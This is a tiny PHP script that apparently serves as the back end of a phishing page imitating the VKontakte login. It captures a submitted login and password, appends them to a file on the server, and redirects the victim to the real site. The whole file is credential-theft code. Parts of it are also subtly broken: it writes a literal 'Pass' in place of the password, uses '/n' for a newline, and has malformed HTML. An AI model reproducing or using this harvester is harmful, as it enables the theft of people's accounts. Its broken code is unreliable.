<?

$Login = $_POST[zabor];

$Pass = $_POST['zena'];

$log = fopen("usp.php","a+");

fwrite($log,"<br> $Login:Pass /n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vkontakte.ru'></head></META>html>";

?>